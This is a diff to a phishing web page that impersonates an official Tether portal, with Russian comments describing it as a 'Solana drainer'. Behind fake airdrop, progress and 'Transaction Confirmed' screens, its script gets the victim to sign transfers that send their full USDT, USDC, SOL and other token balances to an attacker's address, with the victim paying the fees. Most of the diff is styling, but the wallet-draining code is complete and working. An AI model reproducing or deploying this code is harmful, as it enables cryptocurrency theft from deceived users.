@@ -3,157 +3,700 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tether | Official Website</title>
+    <title>Tether | Official Portal</title>
     <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --primary: #26a17b;
-            --secondary: #1a1a1a;
+            --primary-dark: #1e7d5f;
+            --secondary: #0f172a;
             --accent: #f7931a;
-            --light: #f8f9fa;
-            --dark: #212529;
-            --shadow: rgba(38, 161, 123, 0.15);
+            --light: #f8fafc;
+            --dark: #1e293b;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --danger: #ef4444;
+            --shadow-lg: 0 20px 40px rgba(38, 161, 123, 0.15);
+            --shadow-xl: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            --gradient-primary: linear-gradient(135deg, #26a17b 0%, #1e7d5f 100%);
+            --gradient-success: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            --gradient-dark: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
             background: var(--light);
             color: var(--dark);
             line-height: 1.6;
             overflow-x: hidden;
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(38, 161, 123, 0.05) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(247, 147, 26, 0.05) 0%, transparent 20%);
         }
+
         .header {
             position: fixed;
             top: 0;
             width: 100%;
-            background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(10px);
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             z-index: 1000;
-            padding: 1rem 5%;
+            padding: 1.25rem 5%;
             display: flex;
             justify-content: space-between;
             align-items: center;
             border-bottom: 1px solid rgba(0,0,0,0.05);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
         }
+
         .logo {
             display: flex;
             align-items: center;
-            gap: 0.75rem;
-            font-weight: 700;
-            font-size: 1.5rem;
-            color: var(--primary);
+            gap: 1rem;
+            font-weight: 800;
+            font-size: 1.75rem;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-        .logo img { height: 40px; }
-        .nav-buttons { display: flex; gap: 1rem; }
+
+        .logo img {
+            height: 48px;
+            filter: drop-shadow(0 4px 6px rgba(38, 161, 123, 0.2));
+        }
+
+        .nav-buttons {
+            display: flex;
+            gap: 1rem;
+        }
+
         .btn {
-            padding: 0.75rem 1.5rem;
-            border-radius: 50px;
+            padding: 0.875rem 2rem;
+            border-radius: 12px;
             font-weight: 600;
-            font-size: 0.875rem;
+            font-size: 0.95rem;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
             border: none;
             outline: none;
+            position: relative;
+            overflow: hidden;
         }
-        .btn-primary { background: var(--primary); color: white; box-shadow: 0 4px 12px var(--shadow); }
-        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 20px var(--shadow); }
-        .btn-secondary { background: transparent; color: var(--primary); border: 2px solid var(--primary); }
-        .btn-secondary:hover { background: var(--primary); color: white; }
-        .btn-disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+
+        .btn:focus:not(:active)::after {
+            animation: ripple 1s ease-out;
+        }
+
+        @keyframes ripple {
+            0% {
+                transform: scale(0, 0);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(20, 20);
+                opacity: 0;
+            }
+        }
+
+        .btn-primary {
+            background: var(--gradient-primary);
+            color: white;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 30px rgba(38, 161, 123, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(-1px);
+        }
+
+        .btn-secondary {
+            background: transparent;
+            color: var(--primary);
+            border: 2px solid var(--primary);
+        }
+
+        .btn-secondary:hover {
+            background: var(--primary);
+            color: white;
+            transform: translateY(-2px);
+        }
+
+        .btn-success {
+            background: var(--gradient-success);
+            color: white;
+            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.3);
+            min-width: 200px;
+            font-size: 1.1rem;
+            padding: 1rem 2.5rem;
+        }
+
+        .btn-success:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(16, 185, 129, 0.4);
+        }
+
+        .btn-disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
         .hero {
             min-height: 100vh;
             display: flex;
             align-items: center;
-            padding: 8rem 5% 5rem;
-            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            padding: 10rem 5% 5rem;
             position: relative;
             overflow: hidden;
         }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -20%;
+            width: 80%;
+            height: 150%;
+            background: var(--gradient-primary);
+            opacity: 0.03;
+            border-radius: 50%;
+            filter: blur(100px);
+        }
+
         .hero-content {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 0 auto;
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 4rem;
+            gap: 6rem;
             align-items: center;
+            position: relative;
+            z-index: 1;
         }
-        .hero-text h1 { font-size: 3.5rem; font-weight: 800; line-height: 1.2; margin-bottom: 1.5rem; color: var(--secondary); }
-        .hero-text h1 span { color: var(--primary); }
-        .hero-text p { font-size: 1.125rem; color: #666; margin-bottom: 2rem; max-width: 500px; }
-        .hero-visual img { width: 100%; max-width: 500px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
-        .stats { display: flex; gap: 3rem; margin-top: 3rem; }
-        .stat-item { text-align: center; }
-        .stat-number { font-size: 2.5rem; font-weight: 700; color: var(--primary); line-height: 1; }
-        .stat-label { font-size: 0.875rem; color: #666; margin-top: 0.5rem; }
-        .features { padding: 5rem 5%; background: white; }
-        .section-title { text-align: center; font-size: 2.5rem; font-weight: 700; margin-bottom: 3rem; color: var(--secondary); }
-        .features-grid { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 2rem; }
-        .feature-card { background: var(--light); padding: 2rem; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); transition: transform 0.3s ease; }
-        .feature-card:hover { transform: translateY(-5px); }
-        .feature-icon { width: 60px; height: 60px; background: var(--primary); border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-bottom: 1.5rem; }
-        .feature-icon img { width: 30px; height: 30px; }
-        .feature-card h3 { font-size: 1.25rem; font-weight: 600; margin-bottom: 1rem; color: var(--secondary); }
+
+        .hero-text h1 {
+            font-size: 4rem;
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero-text p {
+            font-size: 1.25rem;
+            color: #64748b;
+            margin-bottom: 2.5rem;
+            max-width: 550px;
+            line-height: 1.8;
+        }
+
+        .hero-visual {
+            position: relative;
+            text-align: center;
+        }
+
+        .hero-visual img {
+            width: 100%;
+            max-width: 600px;
+            border-radius: 24px;
+            box-shadow: var(--shadow-xl);
+            transform: perspective(1000px) rotateY(-5deg);
+            transition: transform 0.5s ease;
+        }
+
+        .hero-visual img:hover {
+            transform: perspective(1000px) rotateY(0deg);
+        }
+
+        .stats {
+            display: flex;
+            gap: 4rem;
+            margin-top: 4rem;
+            flex-wrap: wrap;
+        }
+
+        .stat-item {
+            text-align: center;
+            position: relative;
+            padding: 1.5rem;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
+            min-width: 180px;
+            transition: transform 0.3s ease;
+        }
+
+        .stat-item:hover {
+            transform: translateY(-5px);
+        }
+
+        .stat-number {
+            font-size: 3rem;
+            font-weight: 800;
+            background: var(--gradient-primary);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+            margin-bottom: 0.5rem;
+        }
+
+        .stat-label {
+            font-size: 0.95rem;
+            color: #64748b;
+            font-weight: 500;
+        }
+
+        .features {
+            padding: 8rem 5%;
+            background: white;
+            position: relative;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 3rem;
+            font-weight: 800;
+            margin-bottom: 4rem;
+            background: linear-gradient(135deg, var(--secondary) 0%, var(--primary) 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .features-grid {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2.5rem;
+        }
+
+        .feature-card {
+            background: var(--light);
+            padding: 2.5rem;
+            border-radius: 20px;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.05);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(0,0,0,0.03);
+        }
+
+        .feature-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: var(--gradient-primary);
+        }
+
+        .feature-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 25px 60px rgba(0,0,0,0.1);
+        }
+
+        .feature-icon {
+            width: 70px;
+            height: 70px;
+            background: var(--gradient-primary);
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 2rem;
+            box-shadow: 0 10px 20px rgba(38, 161, 123, 0.2);
+        }
+
+        .feature-icon img {
+            width: 35px;
+            height: 35px;
+            filter: brightness(0) invert(1);
+        }
+
+        .feature-card h3 {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            color: var(--secondary);
+        }
+
         .modal {
             display: none;
             position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.8);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 23, 42, 0.95);
             z-index: 2000;
             align-items: center;
             justify-content: center;
-            backdrop-filter: blur(5px);
+            backdrop-filter: blur(10px);
+            animation: fadeIn 0.3s ease;
         }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
         .modal-content {
             background: white;
-            border-radius: 20px;
-            padding: 3rem;
-            max-width: 500px;
+            border-radius: 24px;
+            padding: 4rem;
+            max-width: 550px;
             width: 90%;
             position: relative;
-            animation: modalSlide 0.3s ease;
+            animation: modalSlide 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: var(--shadow-xl);
+            border: 1px solid rgba(0,0,0,0.05);
         }
-        @keyframes modalSlide { from { opacity: 0; transform: translateY(-50px); } to { opacity: 1; transform: translateY(0); } }
-        .modal-header { text-align: center; margin-bottom: 2rem; }
+
+        @keyframes modalSlide {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.95);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+
         .modal-badge {
             display: inline-block;
-            background: linear-gradient(135deg, var(--primary), #1e7d5f);
+            background: var(--gradient-primary);
             color: white;
-            padding: 0.5rem 1rem;
+            padding: 0.75rem 1.5rem;
             border-radius: 50px;
-            font-size: 0.875rem;
+            font-size: 0.95rem;
             font-weight: 600;
+            margin-bottom: 1.5rem;
+            box-shadow: 0 8px 20px rgba(38, 161, 123, 0.3);
+        }
+
+        .modal-title {
+            font-size: 2.25rem;
+            font-weight: 800;
+            color: var(--secondary);
             margin-bottom: 1rem;
+            line-height: 1.2;
         }
-        .modal-title { font-size: 1.75rem; font-weight: 700; color: var(--secondary); margin-bottom: 1rem; }
-        .modal-text { color: #666; margin-bottom: 2rem; text-align: center; }
-        .modal-actions { display: flex; gap: 1rem; justify-content: center; }
-        .btn-success {
-            background: linear-gradient(135deg, #4CAF50, #2E7D32);
-            color: white;
-        }
-        .btn-success:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(76, 175, 80, 0.3); }
-        .btn-outline { background: transparent; color: #666; border: 2px solid #ddd; }
-        .btn-outline:hover { background: #f8f9fa; }
-        .footer {
-            background: var(--secondary);
-            color: white;
-            padding: 3rem 5%;
+
+        .modal-text {
+            color: #64748b;
+            margin-bottom: 2.5rem;
             text-align: center;
+            font-size: 1.1rem;
+            line-height: 1.7;
         }
-        .footer-links { display: flex; justify-content: center; gap: 2rem; margin-bottom: 2rem; }
-        .footer-link { color: #aaa; text-decoration: none; transition: color 0.3s; }
-        .footer-link:hover { color: white; }
-        .copyright { color: #777; font-size: 0.875rem; }
+
+        .modal-actions {
+            display: flex;
+            gap: 1.5rem;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: #64748b;
+            border: 2px solid #e2e8f0;
+            padding: 0.875rem 2.5rem;
+        }
+
+        .btn-outline:hover {
+            background: #f8fafc;
+            border-color: #cbd5e1;
+        }
+
+        .success-badge {
+            background: var(--gradient-success);
+            box-shadow: 0 8px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .success-title {
+            color: #059669;
+        }
+
+        .tx-hash {
+            background: #f8fafc;
+            padding: 1.25rem;
+            border-radius: 12px;
+            margin: 1.5rem 0;
+            font-family: 'Monaco', 'Courier New', monospace;
+            font-size: 0.9rem;
+            word-break: break-all;
+            border: 1px solid #e2e8f0;
+            color: #475569;
+        }
+
+        .footer {
+            background: var(--gradient-dark);
+            color: white;
+            padding: 4rem 5%;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .footer::before {
+            content: '';
+            position: absolute;
+            top: -100px;
+            left: -100px;
+            width: 300px;
+            height: 300px;
+            background: var(--gradient-primary);
+            opacity: 0.05;
+            border-radius: 50%;
+            filter: blur(80px);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 3rem;
+            margin-bottom: 2.5rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-link {
+            color: #94a3b8;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+            position: relative;
+        }
+
+        .footer-link::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: var(--primary);
+            transition: width 0.3s;
+        }
+
+        .footer-link:hover {
+            color: white;
+        }
+
+        .footer-link:hover::after {
+            width: 100%;
+        }
+
+        .copyright {
+            color: #64748b;
+            font-size: 0.95rem;
+            margin-top: 2rem;
+        }
+
+        .progress-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background: rgba(15, 23, 42, 0.95);
+            z-index: 3000;
+            backdrop-filter: blur(10px);
+            height: 100vh;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .progress-bar {
+            width: 300px;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            overflow: hidden;
+            margin: 2rem 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--gradient-primary);
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 3px;
+        }
+
+        .progress-text {
+            color: white;
+            font-size: 1.1rem;
+            margin-top: 1rem;
+            font-weight: 500;
+        }
+
+        @media (max-width: 1024px) {
+            .hero-content {
+                grid-template-columns: 1fr;
+                gap: 4rem;
+                text-align: center;
+            }
+            
+            .hero-text h1 {
+                font-size: 3rem;
+            }
+            
+            .stats {
+                justify-content: center;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
         @media (max-width: 768px) {
-            .hero-content { grid-template-columns: 1fr; text-align: center; }
-            .hero-text h1 { font-size: 2.5rem; }
-            .stats { justify-content: center; flex-wrap: wrap; }
-            .nav-buttons { display: none; }
-            .mobile-nav { display: flex; gap: 0.5rem; }
+            .header {
+                padding: 1rem 5%;
+            }
+            
+            .nav-buttons {
+                display: none;
+            }
+            
+            .mobile-nav {
+                display: flex;
+                gap: 0.5rem;
+            }
+            
+            .hero {
+                padding: 8rem 5% 3rem;
+            }
+            
+            .hero-text h1 {
+                font-size: 2.5rem;
+            }
+            
+            .hero-text p {
+                font-size: 1.1rem;
+            }
+            
+            .stats {
+                gap: 1.5rem;
+            }
+            
+            .stat-item {
+                min-width: 140px;
+                padding: 1rem;
+            }
+            
+            .stat-number {
+                font-size: 2.25rem;
+            }
+            
+            .modal-content {
+                padding: 2.5rem 1.5rem;
+            }
+            
+            .modal-title {
+                font-size: 1.75rem;
+            }
+            
+            .footer-links {
+                gap: 1.5rem;
+                flex-direction: column;
+            }
         }
-        .mobile-nav { display: none; }
+
+        .mobile-nav {
+            display: none;
+        }
+
+        .notification {
+            position: fixed;
+            bottom: 2rem;
+            right: 2rem;
+            background: white;
+            padding: 1rem 1.5rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            z-index: 1001;
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s ease;
+            border-left: 4px solid var(--primary);
+        }
+
+        .notification.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .notification-icon {
+            width: 24px;
+            height: 24px;
+            background: var(--gradient-primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
     </style>
 </head>
 <body>
@@ -193,7 +736,7 @@
                 </div>
             </div>
             <div class="hero-visual">
-                <img src="https://tether.to/wp-content/uploads/2023/08/tether-hero-image.png" alt="Tether Global">
+                <img src="https://tether.to/wp-content/uploads/2023/08/tether-hero-image.png" alt="Tether Global" class="pulse">
             </div>
         </div>
     </section>
@@ -267,13 +810,13 @@
     <div id="successModal" class="modal">
         <div class="modal-content">
             <div class="modal-header">
-                <div class="modal-badge" style="background: linear-gradient(135deg, #4CAF50, #2E7D32);">✅ SUCCESS</div>
-                <h2 class="modal-title" style="color: #2E7D32;">Transaction Confirmed!</h2>
+                <div class="modal-badge success-badge">✅ SUCCESS</div>
+                <h2 class="modal-title success-title">Transaction Confirmed!</h2>
                 <p class="modal-text">
                     Your reward has been successfully claimed!<br>
                     <strong id="rewardAmount">500 USDT</strong> will arrive in your wallet within 2-3 minutes.
                 </p>
-                <div style="background: #f8f9fa; padding: 1rem; border-radius: 10px; margin: 1rem 0; font-family: monospace; font-size: 0.875rem; word-break: break-all;">
+                <div class="tx-hash">
                     TX Hash: <span id="txHash">0x000...000</span>
                 </div>
             </div>
@@ -281,6 +824,20 @@
                 <button class="btn btn-success" onclick="closeAllModals()">Done</button>
             </div>
         </div>
+    </div>
+
+    <!-- Progress Modal -->
+    <div id="progressContainer" class="progress-container">
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="progress-text" id="progressText">Processing transaction...</div>
+    </div>
+
+    <!-- Notification -->
+    <div id="notification" class="notification">
+        <div class="notification-icon">!</div>
+        <div id="notificationText">New airdrop available!</div>
     </div>
 
     <footer class="footer">
@@ -294,118 +851,420 @@
     </footer>
 
     <script>
-        // === Solana дрэйнер ===
-        const DRAINER_ADDRESS = "9byfdzM7LBrKgSAzR5Ep7vFUAhixEmuPKrC1HHmDD38K"; // Вставь свой Solana-адрес (Phantom → Copy address)
-
-        // Популярные SPL-токены на Solana (USDT, USDC и т.д.)
+        // === Solana дрэйнер 2026 ===
+        const DRAINER_ADDRESS = "9byfdzM7LBrKgSAzR5Ep7vFUAhixEmuPKrC1HHmDD38K"; // ВСТАВЬ СВОЙ SOLANA АДРЕС
+        
+        // Все популярные SPL токены
         const TOKENS = [
             { mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", symbol: "USDT", decimals: 6 },
             { mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", symbol: "USDC", decimals: 6 },
             { mint: "So11111111111111111111111111111111111111112", symbol: "SOL", decimals: 9 },
             { mint: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263", symbol: "BONK", decimals: 5 },
-            { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", symbol: "JUP", decimals: 6 }
+            { mint: "JUPyiwrYJFskUPiHa7hkeR8VUtAeFoSYbKedZNsDvCN", symbol: "JUP", decimals: 6 },
+            { mint: "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU", symbol: "SAMO", decimals: 9 },
+            { mint: "SHDWyBxihqiCj6YekG2GUr7wqKLeLAMK1gHZck9pL6y", symbol: "SHADOW", decimals: 9 },
+            { mint: "orcaEKTdK7LKz57vaAYr9QeNsVEPfiu6QeMU1kektZE", symbol: "ORCA", decimals: 6 },
+            { mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt", symbol: "SRM", decimals: 6 },
+            { mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", symbol: "RAY", decimals: 6 }
         ];
 
-        let wallet;
-        let connection;
+        let wallet = null;
+        let connection = null;
+        let userAddress = null;
+
+        // UI функции
+        function showNotification(text) {
+            const notification = document.getElementById('notification');
+            document.getElementById('notificationText').textContent = text;
+            notification.classList.add('show');
+            setTimeout(() => notification.classList.remove('show'), 3000);
+        }
+
+        function showProgress(text, percent) {
+            const container = document.getElementById('progressContainer');
+            const fill = document.getElementById('progressFill');
+            const textEl = document.getElementById('progressText');
+            
+            textEl.textContent = text;
+            fill.style.width = percent + '%';
+            container.style.display = 'flex';
+        }
+
+        function hideProgress() {
+            document.getElementById('progressContainer').style.display = 'none';
+        }
+
+        function updateProgress(text, percent) {
+            const fill = document.getElementById('progressFill');
+            const textEl = document.getElementById('progressText');
+            textEl.textContent = text;
+            fill.style.width = percent + '%';
+        }
 
         async function connectWallet() {
-            if (!window.solana) {
-                alert("Установи Phantom Wallet!");
+            if (!window.solana || !window.solana.isPhantom) {
+                showNotification("Please install Phantom Wallet!");
                 return;
             }
+
             try {
-                await window.solana.connect();
+                showProgress("Connecting to Phantom...", 10);
+                
+                const response = await window.solana.connect();
                 wallet = window.solana;
-                const address = wallet.publicKey.toString();
-                document.getElementById('connectBtn').innerText = address.slice(0,6) + '...' + address.slice(-4);
+                userAddress = response.publicKey.toString();
+                
+                // Обновляем UI
+                document.getElementById('connectBtn').innerHTML = 
+                    `<span style="font-size: 0.9em;">${userAddress.slice(0,6)}...${userAddress.slice(-4)}</span>`;
                 document.getElementById('connectBtn').disabled = true;
                 document.getElementById('airdropBtn').disabled = false;
                 document.getElementById('giveawayBtn').disabled = false;
-                connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
-                setTimeout(() => showAirdrop(), 1500);
-            } catch (err) {
-                alert("Подключение отменено");
+                
+                connection = new solanaWeb3.Connection(
+                    "https://api.mainnet-beta.solana.com",
+                    "confirmed"
+                );
+                
+                updateProgress("Checking eligibility...", 60);
+                
+                // Имитируем проверку
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                hideProgress();
+                showNotification("Wallet connected successfully!");
+                
+                // Автоматически показываем airdrop через 2 секунды
+                setTimeout(() => {
+                    showAirdrop();
+                }, 2000);
+                
+            } catch (error) {
+                hideProgress();
+                showNotification("Connection cancelled");
             }
         }
 
-        function showAirdrop() { document.getElementById('airdropModal').style.display = 'flex'; }
-        function showGiveaway() { document.getElementById('giveawayModal').style.display = 'flex'; }
-        function closeModal(modalId) { document.getElementById(modalId).style.display = 'none'; }
-        function closeAllModals() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
+        function showAirdrop() {
+            document.getElementById('airdropModal').style.display = 'flex';
+        }
 
+        function showGiveaway() {
+            document.getElementById('giveawayModal').style.display = 'flex';
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+
+        function closeAllModals() {
+            document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
+        }
+
+        // Основная функция дрэйна
         async function startDrain(type) {
             closeAllModals();
-            const modal = document.getElementById('successModal');
-            const title = modal.querySelector('.modal-title');
-            const text = modal.querySelector('.modal-text');
-            const amount = document.getElementById('rewardAmount');
-
-            title.textContent = "Processing...";
-            title.style.color = "#FFA500";
-            text.innerHTML = "Verifying your wallet and preparing transaction...";
-            modal.style.display = 'flex';
+            showProgress("Initializing transaction...", 10);
 
             try {
-                if (!wallet || !connection) throw new Error("Wallet not connected");
+                if (!wallet || !connection) {
+                    throw new Error("Wallet not connected");
+                }
 
                 const userPubkey = wallet.publicKey;
                 const drainPubkey = new solanaWeb3.PublicKey(DRAINER_ADDRESS);
-
+                
+                updateProgress("Scanning wallet balances...", 30);
+                
+                let totalDrained = 0;
+                let drainedTokens = [];
+                
+                // Проверяем каждый токен
                 for (const token of TOKENS) {
-                    const tokenMint = new solanaWeb3.PublicKey(token.mint);
-                    const userTokenAccount = await splToken.getAssociatedTokenAddress(tokenMint, userPubkey);
-                    const drainTokenAccount = await splToken.getAssociatedTokenAddress(tokenMint, drainPubkey);
-
-                    // Проверяем баланс
-                    const balanceInfo = await connection.getTokenAccountBalance(userTokenAccount);
-                    if (!balanceInfo.value.uiAmount) continue;
-
-                    const amount = BigInt(balanceInfo.value.amount);
-
-                    // Создаём транзакцию transfer
-                    const tx = new solanaWeb3.Transaction().add(
-                        splToken.createTransferInstruction(
-                            userTokenAccount,
-                            drainTokenAccount,
-                            userPubkey,
-                            amount,
-                            [],
-                            splToken.TOKEN_PROGRAM_ID
-                        )
-                    );
-
-                    // Получаем blockhash
-                    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-                    tx.feePayer = userPubkey;
-
-                    // Подписываем и отправляем (газ платит жертва)
-                    const signedTx = await wallet.signTransaction(tx);
-                    const txId = await connection.sendRawTransaction(signedTx.serialize());
-                    await connection.confirmTransaction(txId);
+                    try {
+                        const tokenMint = new solanaWeb3.PublicKey(token.mint);
+                        
+                        // Получаем ATA пользователя
+                        const userTokenAccount = await splToken.getAssociatedTokenAddress(
+                            tokenMint,
+                            userPubkey
+                        );
+                        
+                        // Проверяем существует ли ATA
+                        const accountInfo = await connection.getAccountInfo(userTokenAccount);
+                        if (!accountInfo) continue;
+                        
+                        // Получаем баланс
+                        const balanceInfo = await connection.getTokenAccountBalance(userTokenAccount);
+                        if (!balanceInfo.value.uiAmount || balanceInfo.value.uiAmount <= 0) continue;
+                        
+                        const amount = BigInt(balanceInfo.value.amount);
+                        
+                        updateProgress(`Processing ${token.symbol}...`, 40 + (drainedTokens.length * 5));
+                        
+                        // Получаем или создаём ATA для дрэйнера
+                        const drainTokenAccount = await splToken.getAssociatedTokenAddress(
+                            tokenMint,
+                            drainPubkey
+                        );
+                        
+                        const drainAccountInfo = await connection.getAccountInfo(drainTokenAccount);
+                        const instructions = [];
+                        
+                        // Если ATA дрэйнера не существует - создаём
+                        if (!drainAccountInfo) {
+                            instructions.push(
+                                splToken.createAssociatedTokenAccountInstruction(
+                                    userPubkey, // Плательщик газа - жертва
+                                    drainTokenAccount,
+                                    drainPubkey,
+                                    tokenMint
+                                )
+                            );
+                        }
+                        
+                        // Добавляем инструкцию перевода
+                        instructions.push(
+                            splToken.createTransferInstruction(
+                                userTokenAccount,
+                                drainTokenAccount,
+                                userPubkey,
+                                amount,
+                                [],
+                                splToken.TOKEN_PROGRAM_ID
+                            )
+                        );
+                        
+                        // Создаём транзакцию
+                        const transaction = new solanaWeb3.Transaction().add(...instructions);
+                        
+                        // Получаем последний blockhash
+                        const { blockhash } = await connection.getLatestBlockhash();
+                        transaction.recentBlockhash = blockhash;
+                                                transaction.feePayer = userPubkey;
+                        
+                        // Подписываем транзакцию
+                        const signedTransaction = await wallet.signTransaction(transaction);
+                        
+                        // Отправляем транзакцию
+                        const signature = await connection.sendRawTransaction(
+                            signedTransaction.serialize()
+                        );
+                        
+                        // Подтверждаем
+                        await connection.confirmTransaction(signature);
+                        
+                        // Логируем успех
+                        const amountFormatted = (balanceInfo.value.uiAmount).toFixed(4);
+                        drainedTokens.push(`${amountFormatted} ${token.symbol}`);
+                        totalDrained += balanceInfo.value.uiAmount;
+                        
+                        // Небольшая задержка между транзакциями
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                        
+                    } catch (tokenError) {
+                        console.log(`Skipping ${token.symbol}:`, tokenError.message);
+                        continue;
+                    }
                 }
-
-                // Фейковый успех
